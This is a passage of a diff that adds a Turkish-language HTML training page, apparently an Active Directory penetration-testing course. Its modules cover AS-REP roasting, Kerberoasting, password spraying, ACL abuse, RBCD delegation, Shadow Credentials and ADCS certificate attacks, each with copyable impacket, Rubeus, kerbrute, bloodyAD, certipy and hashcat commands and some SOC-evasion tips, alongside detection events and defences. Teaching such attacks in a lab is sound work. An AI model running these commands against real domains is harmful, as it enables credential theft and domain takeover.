+          <p>Önce lab'ında bir hesabın pre-auth'unu kapat (kurban yarat), sonra saldır:</p>
+          <pre><span class="c"># (Lab kurulumu — DC'de PowerShell) bir hesabı savunmasız yap</span>
+Set-ADAccountControl -Identity <span class="s">svc-web</span> -DoesNotRequirePreAuth $true<button class="copy">kopyala</button></pre>
+          <pre><span class="c"># Credential'sız — kullanıcı listesiyle savunmasızları bul & hash çek</span>
+impacket-GetNPUsers <span class="p">bank.local</span>/ -usersfile users.txt -no-pass -dc-ip <span class="p">DC_IP</span>
+<span class="c"># Bir domain user'ın varsa tüm zayıf hesapları tara</span>
+impacket-GetNPUsers <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -request -format hashcat -outputfile asrep.txt
+<span class="c"># Çevrimdışı kır</span>
+hashcat -m <span class="p">18200</span> asrep.txt rockyou.txt --rules best64.rule<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p><code>$krb5asrep$23$svc-web@BANK.LOCAL:....</code> biçiminde bir hash almalısın. hashcat
+          bunu kırdığında servis hesabının açık parolası düşer. Bu artık geçerli bir credential'dır →
+          Modül 01'deki enumerasyonu bu kez o hesapla tekrarla.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> <b>Event 4768</b> — pre-auth gerektirmeyen
+          bir hesap için RC4 (<code>etype 0x17</code>) TGT isteği. Toplu tarama birçok 4768 üretir.
+          Savunma: hiçbir hesapta <code>DONT_REQ_PREAUTH</code> olmamasını sağlamak (denetle ve kaldır).</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab'da 2 hesabın pre-auth'unu kapat, ikisini de bulup kır.</li>
+            <li>BloodHound'da "AS-REP Roastable users" hazır sorgusunu çalıştır — aynı hesapları görüyor musun?</li>
+            <li>DC'de kendi saldırının 4768 olaylarını bul.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m3">Bu modülü tamamladım</label>
+            <span class="st">03 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M4 -->
+    <section class="mod" id="m4" data-mod>
+      <div class="mod-badge">MODÜL 04 <span class="lv">saldırı · çok yaygın</span></div>
+      <h2>Kerberoasting</h2>
+      <p class="sub">SPN'li her servis hesabı, çevrimdışı kırılabilir bir hedef demektir.</p>
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Modül 02'den hatırla: bir <b>TGS bileti, hedef servis hesabının parola hash'iyle</b> şifrelenir.
+          Herhangi bir domain kullanıcısı, herhangi bir SPN için TGS isteyebilir. Yani SPN'li bir hesabın
+          TGS'ini iste, şifreli parçayı çevrimdışı kır → servis hesabının parolası. Servis hesapları sık
+          sık <b>yüksek yetkili</b> ve <b>eski/zayıf parolalı</b> olduğu için bu çok verimlidir.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body">
+          <p>Tek şart: <b>geçerli bir domain kullanıcısı</b> olman ve hedefin <b>bir SPN taşıması</b>.
+          Hedefin yetkisine dokunman gerekmez — TGS istemek meşru bir işlemdir. Zayıflık, servis
+          hesaplarının parolalarının nadiren değişmesi ve çoğu zaman insan tarafından belirlenmiş
+          olmasıdır.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># (Lab) bir hesaba SPN ver → kerberoastable yap</span>
+setspn -a <span class="s">MSSQLSvc/db01.bank.local:1433</span> <span class="s">svc-sql</span><button class="copy">kopyala</button></pre>
+          <pre><span class="c"># Linux — Impacket ile SPN'li hesapların TGS'ini iste</span>
+impacket-GetUserSPNs <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -dc-ip <span class="p">DC_IP</span> -request -outputfile kerb.txt
+<span class="c"># Windows — Rubeus, sadece RC4 destekleyen hesapları hedefle (daha sessiz)</span>
+Rubeus.exe kerberoast /nowrap /rc4opsec
+<span class="c"># Kır</span>
+hashcat -m <span class="p">13100</span> kerb.txt rockyou.txt --rules best64.rule<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p><code>$krb5tgs$23$*svc-sql$BANK.LOCAL$...</code> hash'i. Kırıldığında servis hesabının
+          parolası düşer. Bu hesap bir yerde local admin ya da yüksek yetkiliyse, yatay hareket veya
+          yükseltme başlar. BloodHound'da hesabın "outbound" haklarına bak.</p>
+          <div class="callout tip"><span class="ct">Neden AS-REP'ten farklı</span> AS-REP <b>pre-auth kapalı</b>
+          hesapları hedefler (nadir); Kerberoast <b>SPN taşıyan</b> hesapları (çok yaygın). Format kodları
+          da farklı: 18200 vs 13100.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> <b>Event 4769</b> — özellikle çok sayıda,
+          kısa sürede ve <code>etype 0x17 (RC4)</code> ile. Bir kullanıcının aniden onlarca farklı SPN
+          için TGS istemesi klasik kerberoast imzasıdır. Savunma: servis hesaplarına <b>gMSA</b> (25+
+          karakter, otomatik rotasyon) veya çok güçlü parola, ve <b>AES zorlaması</b>.</div>
+          <p>Bu yüzden gerçek engagement'ta "tüm SPN'leri birden çekme" — <code>/rc4opsec</code> ile
+          seçici ol, aksi halde SOC seni anında görür.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab'da bir hesabı kerberoastable yap, TGS'ini çek ve kır.</li>
+            <li>Aynı hesaba AES zorla (<code>msDS-SupportedEncryptionTypes</code>) ve RC4 hash'in gelmediğini gözlemle.</li>
+            <li>DC'de 4769 olaylarını bul, <code>etype</code>'a göre filtrele.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m4">Bu modülü tamamladım</label>
+            <span class="st">04 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M5 -->
+    <section class="mod" id="m5" data-mod>
+      <div class="mod-badge">MODÜL 05 <span class="lv">saldırı · dikkat</span></div>
+      <h2>Parola Sprey &amp; Güvenli Enumerasyon</h2>
+      <p class="sub">Bir hesabı kilitlemeden domain'e ilk ayak basışını yaratmak.</p>
+      <div class="step">
+        <div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Brute-force bir hesaba çok parola dener → kilitlenme. <b>Parola sprey</b> tersini yapar:
+          <b>tek bir olası parolayı çok sayıda hesapta</b> dener. Böylece hesap başına deneme az kalır,
+          lockout eşiğinin altında durursun. Mantık: büyük bir organizasyonda birileri mutlaka
+          <code>Sirket2026!</code> gibi bir parola kullanır.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic why">⚙️</div><h3>Neden dikkatli olmalısın</h3></div>
+        <div class="body">
+          <div class="callout warn"><span class="ct">Bankada kritik</span> Yanlış yapılan sprey
+          <b>onlarca hesabı kilitler</b> → operasyon kesintisi + anında fark edilme + RoE ihlali. Sprey
+          öncesi <b>mutlaka</b> lockout eşiğini ve gözlem penceresini öğren, ve <b>her hesaba pencere
+          başına en fazla 1 deneme</b> bırakacak şekilde yavaşlat.</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># 1) Lockout politikasını öğren (eşik + reset süresi)</span>
+nxc smb <span class="p">DC_IP</span> -u <span class="s">user</span> -p <span class="s">'Parola!'</span> --pass-pol
+<span class="c"># 2) Geçerli kullanıcı listesini doğrula (parola denemez → güvenli)</span>
+kerbrute userenum -d <span class="p">bank.local</span> --dc <span class="p">DC_IP</span> users.txt
+<span class="c"># 3) Tek parolayı, eşiğin altında sprey et</span>
+kerbrute passwordspray -d <span class="p">bank.local</span> --dc <span class="p">DC_IP</span> valid_users.txt <span class="s">'Sirket2026!'</span>
+<span class="c"># NetExec alternatifi — --continue-on-success ile birden çok isabet</span>
+nxc smb <span class="p">DC_IP</span> -u valid_users.txt -p <span class="s">'Sirket2026!'</span> --continue-on-success<button class="copy">kopyala</button></pre>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body">
+          <p>Bir veya birkaç <code>[+] user:Sirket2026!</code> isabeti. Elde ettiğin her credential ile
+          Modül 01'e dönüp o hesabın gözünden ortamı yeniden haritala — farklı hesaplar farklı yetkiler
+          görür. Bu döngü (foothold → enum → yeni foothold) engagement'ın kalbidir.</p>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body">
+          <div class="callout det"><span class="ct">İz</span> Çok sayıda hesapta <b>4771/4625</b>
+          (başarısız kimlik doğrulama), kısa pencerede aynı kaynaktan. Modern kimlik korumaları bunu
+          "password spray" olarak doğrudan etiketler. Savunma: MFA, akıllı lockout, ve zayıf/sık
+          kullanılan parolaların yasaklanması (Azure AD Password Protection benzeri).</div>
+        </div>
+      </div>
+      <div class="step">
+        <div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body">
+          <ul>
+            <li>Lab'ının lockout eşiğini bul, kaç deneme güvenli hesapla.</li>
+            <li>Bir sprey çalıştır, DC'de 4771 olaylarını gör.</li>
+            <li>Neden <code>kerbrute userenum</code> lockout tetiklemez? — açıkla.</li>
+          </ul>
+          <div class="done-row"><label><input type="checkbox" data-done="m5">Bu modülü tamamladım</label>
+            <span class="st">05 / 20</span></div>
+        </div>
+      </div>
+    </section>
+
+    <!-- M6 ACL -->
+    <section class="mod" id="m6" data-mod>
+      <div class="mod-badge">MODÜL 06 <span class="lv">yükseltme · çok yaygın</span></div>
+      <h2>ACL İstismarı</h2>
+      <p class="sub">BloodHound'un çizdiği kenarları (GenericAll, WriteDACL…) gerçek ele geçirmeye çevir.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Her AD objesinin bir <span class="k">DACL</span>'i vardır: hangi principal'ın obje üzerinde
+          ne yapabileceğini listeler. Bu izinler zamanla, yanlışlıkla ya da tembellikten yanlış kişilere
+          verilir. Önemli olan kenarlar (edge):</p>
+          <ul>
+            <li><span class="k">GenericAll</span> — obje üzerinde tam kontrol (her şey mümkün).</li>
+            <li><span class="k">GenericWrite / WriteProperty</span> — öznitelik yazma (SPN ekle→kerberoast, veya logon script).</li>
+            <li><span class="k">WriteDACL</span> — objenin izin listesini değiştir → kendine GenericAll ver.</li>
+            <li><span class="k">WriteOwner</span> — objenin sahibi ol → sonra DACL'i yaz.</li>
+            <li><span class="k">ForceChangePassword</span> — kullanıcının parolasını eski parolayı bilmeden değiştir.</li>
+            <li><span class="k">AddMember</span> — bir gruba üye ekle (kendini "Domain Admins"e).</li>
+          </ul>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body"><p>AD, izinleri "kim neyi yapabilir" olarak uygular; niyeti sorgulamaz. Eğer
+          düşük yetkili bir hesabın yüksek yetkili bir obje üzerinde yazma hakkı varsa, bu doğrudan bir
+          yükseltme yoludur. Saldırı çoğu zaman bir <b>zincirdir</b>: WriteOwner → WriteDACL → GenericAll
+          → ForceChangePassword.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <p>Önce BloodHound'da "sahip olduğun" hesaptan çıkan (outbound) ACL kenarlarını bul. Sonra istismar et:</p>
+          <pre><span class="c"># Hedef kullanıcının parolasını zorla değiştir (ForceChangePassword)</span>
+net rpc password <span class="s">"hedef"</span> <span class="s">"YeniP1!"</span> -U <span class="p">bank.local</span>/<span class="s">user</span>%<span class="s">'Parola!'</span> -S <span class="p">DC_IP</span>
+<span class="c"># bloodyAD ile — çok yönlü ACL istismarı</span>
+bloodyAD -u <span class="s">user</span> -p <span class="s">'Parola!'</span> -d <span class="p">bank.local</span> --host <span class="p">DC_IP</span> add groupMember <span class="s">"Domain Admins"</span> <span class="s">user</span>
+<span class="c"># WriteOwner → sahiplen, sonra DACL yaz</span>
+bloodyAD -u <span class="s">user</span> -p <span class="s">'Parola!'</span> -d <span class="p">bank.local</span> --host <span class="p">DC_IP</span> set owner <span class="s">TargetObj</span> <span class="s">user</span>
+<span class="c"># WriteDACL → kendine DCSync yetkisi ver</span>
+impacket-dacledit -action write -rights DCSync -principal <span class="s">user</span> -target-dn <span class="s">"DC=bank,DC=local"</span> <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span><button class="copy">kopyala</button></pre>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>Hedef gruba eklendiğini/parolanın değiştiğini <code>net user</code> veya yeni
+          credential ile giriş yaparak doğrula. WriteDACL zincirinde sonuçta kendine <b>DCSync</b> hakkı
+          verdiysen Modül 11'e geçebilirsin. <b>Her değişikliği not al</b> — geri alacaksın.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> <b>4728/4732</b> (gruba üye ekleme),
+          <b>5136</b> (dizin objesi değişikliği — DACL/owner), <b>4724</b> (parola sıfırlama). AD değişiklikleri
+          olgun ortamda izlenir. Savunma: hassas objelerde (Tier-0, AdminSDHolder) ACL denetimi ve en az
+          yetki. ForceChangePassword gerçek kullanıcıyı kilitleyebilir → mümkünse Shadow Credentials (M08) tercih et.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>Lab'da bir hesaba başka bir kullanıcı üzerinde GenericAll ver, sonra o hesapla parolayı değiştir.</li>
+          <li>Bir WriteOwner → WriteDACL → DCSync zincirini uçtan uca çalış.</li>
+          <li>Yaptığın her değişikliği geri al (temizlik pratiği).</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m6">Bu modülü tamamladım</label><span class="st">06 / 20</span></div></div></div>
+    </section>
+
+    <!-- M7 DELEGATION -->
+    <section class="mod" id="m7" data-mod>
+      <div class="mod-badge">MODÜL 07 <span class="lv">yükseltme · ileri</span></div>
+      <h2>Kerberos Delegasyon</h2>
+      <p class="sub">Unconstrained / Constrained / RBCD — en güçlü ama en çok kavram gerektiren yol.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body">
+          <p>Delegasyon, bir servisin <b>kullanıcı adına başka bir servise</b> gitmesine izin verir
+          (ör. web sunucusu senin adına SQL'e bağlanır). Üç tür var:</p>
+          <ul>
+            <li><span class="k">Unconstrained (KUD)</span> — makine, ona bağlanan herkesin <b>TGT</b>'sini belleğinde
+            tutar. Buraya bir DA çekersen (veya coercion ile DC'yi zorlarsan) onun TGT'sini çalarsın. En tehlikeli.</li>
+            <li><span class="k">Constrained (KCD)</span> — makine yalnızca <b>belirli SPN'lere</b> delege edebilir.
+            <code>msDS-AllowedToDelegateTo</code> + S4U2Proxy ile o hedeflerde impersonation.</li>
+            <li><span class="k">Resource-Based (RBCD)</span> — kontrol <b>hedef objede</b>: "kim bana delege edebilir"
+            <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> ile tutulur. Hedefe yazma yetkin varsa bunu sen kurarsın.</li>
+          </ul>
+          <p>Sihir <b>S4U</b>'da: <span class="k">S4U2Self</span> (kendine, herhangi bir kullanıcı adına bilet üret)
+          + <span class="k">S4U2Proxy</span> (o bileti hedef servise ilet). Sonuç: hedefte istediğin kullanıcı gibi davranırsın.</p>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body"><p>Delegasyon güveni "makine hesabı"na verir. Bir makine hesabını kontrol edersen
+          (parolası/hash'i sende) ya da bir objeye RBCD yazabilirsen, S4U ile o kaynağın üzerinde
+          <b>Administrator</b> gibi bilet üretebilirsin — hiç parola kırmadan.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab — RBCD (en pratik senaryo)</h3></div>
+        <div class="body">
+          <pre><span class="c"># Ön koşul: hedef makine üzerinde GenericWrite/GenericAll yetkin (bkz. M06)</span>
+<span class="c"># 1) Kontrolünde bir makine hesabı oluştur (MachineAccountQuota>0 ise)</span>
+impacket-addcomputer <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -computer-name <span class="s">EVIL$</span> -computer-pass <span class="s">'Evil123!'</span>
+<span class="c"># 2) Hedefe RBCD yaz: EVIL$ -> TARGET$ adına davranabilsin</span>
+impacket-rbcd <span class="p">bank.local</span>/<span class="s">user</span>:<span class="s">'Parola!'</span> -delegate-from <span class="s">EVIL$</span> -delegate-to <span class="s">TARGET$</span> -action write
+<span class="c"># 3) S4U ile hedefte Administrator bileti al</span>
+impacket-getST <span class="p">bank.local</span>/<span class="s">EVIL$</span>:<span class="s">'Evil123!'</span> -spn <span class="s">cifs/target.bank.local</span> -impersonate <span class="s">Administrator</span>
+<span class="c"># 4) Bileti kullan → hedefte kod çalıştır</span>
+export KRB5CCNAME=Administrator.ccache
+impacket-wmiexec -k -no-pass <span class="p">bank.local</span>/<span class="s">Administrator</span>@<span class="s">target.bank.local</span><button class="copy">kopyala</button></pre>
+          <div class="callout tip"><span class="ct">Unconstrained lab</span> Bir makineye KUD ver, oraya
+          coercion (M10) ile DC$ hesabını zorla, Rubeus <code>monitor</code> ile DC'nin TGT'sini yakala → DCSync.</div>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>Hedef makinede <b>SYSTEM/Administrator</b> shell. RBCD yolunda <code>Administrator.ccache</code>
+          üretilir ve <code>wmiexec -k</code> ile kod çalışır. Başarısızsa: MachineAccountQuota 0 olabilir
+          (bankada olağan) → mevcut kontrollü bir makine hesabı gerekir.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> <b>4741</b> (makine hesabı oluşturma),
+          <b>5136</b> (msDS-AllowedToActOnBehalfOf… yazımı), S4U ile ilişkili <b>4769</b>'lar. Savunma:
+          <b>MachineAccountQuota=0</b>, hassas hesaplarda "Account is sensitive and cannot be delegated",
+          unconstrained delegasyonu tamamen kaldırmak, DC'leri "Protected Users" ile korumak.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>RBCD zincirini uçtan uca çalıştırıp hedefte shell al.</li>
+          <li>"S4U2Self ile S4U2Proxy'nin farkı ne?" — kendi cümlenle.</li>
+          <li>MachineAccountQuota'yı 0 yap, saldırının nasıl bozulduğunu gör; sonra mevcut makine hesabıyla çöz.</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m7">Bu modülü tamamladım</label><span class="st">07 / 20</span></div></div></div>
+    </section>
+
+    <!-- M8 SHADOW -->
+    <section class="mod" id="m8" data-mod>
+      <div class="mod-badge">MODÜL 08 <span class="lv">yükseltme · sessiz</span></div>
+      <h2>Shadow Credentials</h2>
+      <p class="sub">Parola değiştirmeden, sertifika anahtarı ekleyerek sessizce hesap ele geçirme.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body"><p>Windows Hello / anahtar tabanlı Kerberos (PKINIT) için hesaplarda
+          <span class="k">msDS-KeyCredentialLink</span> özniteliği vardır — hesaba ait açık anahtarları tutar.
+          Bu özniteliğe <b>yazma yetkin</b> varsa, kendi ürettiğin bir anahtar çiftini oraya eklersin.
+          Artık o hesap adına PKINIT ile kimlik doğrulayıp <b>TGT ve NT hash</b> alabilirsin — parolayı
+          hiç değiştirmeden.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır (ve neden tercih edilir)</h3></div>
+        <div class="body"><p>ForceChangePassword hesabı bozar, kullanıcı fark eder, servis hesabıysa uygulama
+          çöker. Shadow Credentials ise <b>parolaya dokunmaz</b> — kullanıcı hiçbir şey fark etmez, iş de
+          bozulmaz. Bu yüzden aynı yazma yetkisi (GenericWrite/GenericAll) varsa, ele geçirmenin en temiz
+          yolu budur. Koşul: <b>2016+ DC</b> ve ortamda <b>ADCS/PKINIT</b>.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># Linux — pywhisker ile hedefin KeyCredentialLink'ine anahtar ekle</span>
+pywhisker -d <span class="p">bank.local</span> -u <span class="s">user</span> -p <span class="s">'Parola!'</span> --target <span class="s">TARGET$</span> --action add
+<span class="c"># Çıkan .pfx + parola ile PKINIT → TGT al</span>
+gettgtpkinit.py -cert-pfx <span class="s">cert.pfx</span> -pfx-pass <span class="s">certpass</span> <span class="p">bank.local</span>/<span class="s">TARGET$</span> tgt.ccache
+<span class="c"># TGT'den NT hash çıkar (UnPAC-the-hash)</span>
+export KRB5CCNAME=tgt.ccache
+getnthash.py -key <span class="s">&lt;AS-REP-key&gt;</span> <span class="p">bank.local</span>/<span class="s">TARGET$</span>
+<span class="c"># Windows — Whisker (aynı işi .NET tarafında yapar)</span>
+Whisker.exe add /target:<span class="s">TARGET$</span><button class="copy">kopyala</button></pre>
+          <div class="callout tip"><span class="ct">Certipy kısayolu</span>
+          <code>certipy shadow auto -u user@bank.local -p 'Parola!' -account TARGET$</code> tüm zinciri tek komutta yapar.</div>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>Hedef hesabın <b>NT hash'i</b> veya kullanılabilir TGT'si. Artık Pass-the-Hash /
+          Pass-the-Ticket ile o kimlikle hareket edersin. <b>İş bitince eklediğin anahtarı kaldır</b>
+          (<code>--action remove</code>) — temizlik.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> <b>5136</b> — msDS-KeyCredentialLink
+          değişikliği (izlenmesi gereken kritik öznitelik). PKINIT sonrası <b>4768</b> (sertifika tabanlı TGT).
+          Savunma: bu özniteliğin yazımını denetlemek, gereksiz yazma yetkilerini kısmak, ADCS'i sıkılaştırmak.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>Bir makine hesabına Shadow Credentials ekleyip NT hash'ini al.</li>
+          <li>"Neden ForceChangePassword yerine bunu tercih ederiz?" — 2 cümle.</li>
+          <li>DC'de 5136 olayında msDS-KeyCredentialLink değişikliğini bul, sonra anahtarı temizle.</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m8">Bu modülü tamamladım</label><span class="st">08 / 20</span></div></div></div>
+    </section>
+
+    <!-- M9 ADCS -->
+    <section class="mod" id="m9" data-mod>
+      <div class="mod-badge">MODÜL 09 <span class="lv">yükseltme · bankada kritik</span></div>
+      <h2>ADCS Saldırıları (ESC1-16)</h2>
+      <p class="sub">Sertifika servisleri — olgun ortamlarda en sessiz ve en sık Domain Admin yolu.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
+        <div class="body"><p>AD Certificate Services (ADCS), domain'e sertifika dağıtır. Bir sertifika
+          <b>kimlik kanıtı</b> olarak kullanılabilir (PKINIT) — yani doğru sertifikayı alırsan onunla
+          TGT/NT hash alırsın. Sorun, <b>sertifika şablonlarının</b> (template) ve <b>CA yapılandırmasının</b>
+          çok sık yanlış ayarlanmasıdır. En klasik olan <span class="k">ESC1</span>: şablon, sertifika
+          isteyenin <b>istediği kimliği (SAN/UPN)</b> girmesine izin verir → "administrator" için sertifika
+          iste, DA ol.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic why">⚙️</div><h3>Neden çalışır</h3></div>
+        <div class="body"><p>Şablon (1) düşük yetkili kullanıcıların enroll olmasına izin veriyor, (2) client
+          authentication EKU'su içeriyor ve (3) subject'i istekte belirlemene izin veriyorsa, herhangi bir
+          kullanıcı kendine "Administrator sertifikası" bastırabilir. Sertifika yolu <b>parola/hash'e dokunmaz</b>,
+          bu yüzden çok sessizdir ve sertifika iptal edilene kadar (genelde uzun süre) geçerlidir.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic lab">🔬</div><h3>Lab</h3></div>
+        <div class="body">
+          <pre><span class="c"># 1) Zafiyetli şablonları bul — Certipy her ESC'yi etiketler</span>
+certipy find -u <span class="s">user</span>@<span class="p">bank.local</span> -p <span class="s">'Parola!'</span> -dc-ip <span class="p">DC_IP</span> -vulnerable -enabled -stdout
+<span class="c"># 2) ESC1 — istediğin UPN ile sertifika iste</span>
+certipy req -u <span class="s">user</span>@<span class="p">bank.local</span> -p <span class="s">'Parola!'</span> -ca <span class="s">BANK-CA</span> -template <span class="s">VulnTemplate</span> -upn <span class="s">administrator@bank.local</span>
+<span class="c"># 3) Sertifikayla TGT + NT hash al</span>
+certipy auth -pfx <span class="s">administrator.pfx</span> -dc-ip <span class="p">DC_IP</span><button class="copy">kopyala</button></pre>
+          <p><b>ESC hızlı referans</b> — Certipy hangi etiketi verirse ilgili yol:</p>
+          <div style="overflow-x:auto"><table class="esc-table">
+            <tr><th>Kod</th><th>Yanlış yapılandırma</th><th>İstismar</th></tr>
+            <tr><td>ESC1</td><td>Şablon SAN belirtmeye izin (ENROLLEE_SUPPLIES_SUBJECT)</td><td>İstediğin UPN ile sertifika → DA</td></tr>
+            <tr><td>ESC2</td><td>Any Purpose / no EKU</td><td>Her amaçla kullanılabilir sertifika</td></tr>
+            <tr><td>ESC3</td><td>Enrollment Agent şablonu</td><td>Başkası adına enroll et</td></tr>
+            <tr><td>ESC4</td><td>Şablon üzerinde yazma yetkisi (ACL)</td><td>Şablonu ESC1'e çevir, sonra istismar</td></tr>
+            <tr><td>ESC6</td><td>CA'da EDITF_ATTRIBUTESUBJECTALTNAME2</td><td>Her şablonda SAN spoof</td></tr>
+            <tr><td>ESC7</td><td>CA üzerinde ManageCA/ManageCertificates</td><td>Şablon aç, isteği onayla</td></tr>
+            <tr><td>ESC8</td><td>HTTP web enrollment + NTLM relay</td><td>Makine kimliğini relay (bkz. M10)</td></tr>
+            <tr><td>ESC9/10</td><td>Zayıf sertifika eşleme</td><td>UPN spoof ile impersonation</td></tr>
+            <tr><td>ESC11</td><td>RPC enrollment şifreleme zorlaması kapalı</td><td>ICPR'a relay</td></tr>
+            <tr><td>ESC13</td><td>Şablona bağlı issuance policy → grup</td><td>Grup üyeliğini sertifikayla al</td></tr>
+          </table></div>
+        </div></div>
+
+      <div class="step"><div class="step-h"><div class="ic out">📤</div><h3>Beklenen çıktı</h3></div>
+        <div class="body"><p>Bir <code>.pfx</code> (sertifika) ve <code>certipy auth</code> sonrası hedef
+          kimliğin <b>NT hash'i + TGT</b>'si. ESC1'de bu genelde doğrudan <b>Administrator</b> olur → domain
+          bitti. CA adını ve şablon adını rapor için not al.</p></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic det">🛡️</div><h3>Tespit &amp; savunma</h3></div>
+        <div class="body"><div class="callout det"><span class="ct">İz</span> CA'da <b>4886/4887</b> (sertifika
+          isteği/verilişi) — ama nadiren izlenir, bu yüzden sessizdir. PKINIT sonrası <b>4768</b>. Savunma:
+          şablonlarda ENROLLEE_SUPPLIES_SUBJECT'i kapatmak, manager approval istemek, enroll yetkilerini
+          kısmak, EDITF_ATTRIBUTESUBJECTALTNAME2'yi kaldırmak. Certipy find çıktısını mavi takıma da vermek değerlidir.</div></div></div>
+
+      <div class="step"><div class="step-h"><div class="ic task">🎯</div><h3>Mini görev</h3></div>
+        <div class="body"><ul>
+          <li>Lab CA'nda bir şablonu ESC1'e uygun hale getir, sonra Administrator sertifikası bas.</li>
+          <li>ESC8'i M10'daki NTLM relay ile birleştirip makine üzerinden domain'e ulaş.</li>
+          <li>Şablonu düzelt (manager approval aç) ve saldırının artık çalışmadığını doğrula.</li>
+        </ul>
+        <div class="done-row"><label><input type="checkbox" data-done="m9">Bu modülü tamamladım</label><span class="st">09 / 20</span></div></div></div>
+    </section>
+
+    <!-- M10 RELAY -->
+    <section class="mod" id="m10" data-mod>
+      <div class="mod-badge">MODÜL 10 <span class="lv">yükseltme · ağ</span></div>
+      <h2>NTLM Relay &amp; Coercion</h2>
+      <p class="sub">Bir kimlik doğrulamayı yakala/zorla, başka bir servise ilet — ESC8'in de temeli.</p>
+
+      <div class="step"><div class="step-h"><div class="ic concept">🧠</div><h3>Kavram</h3></div>
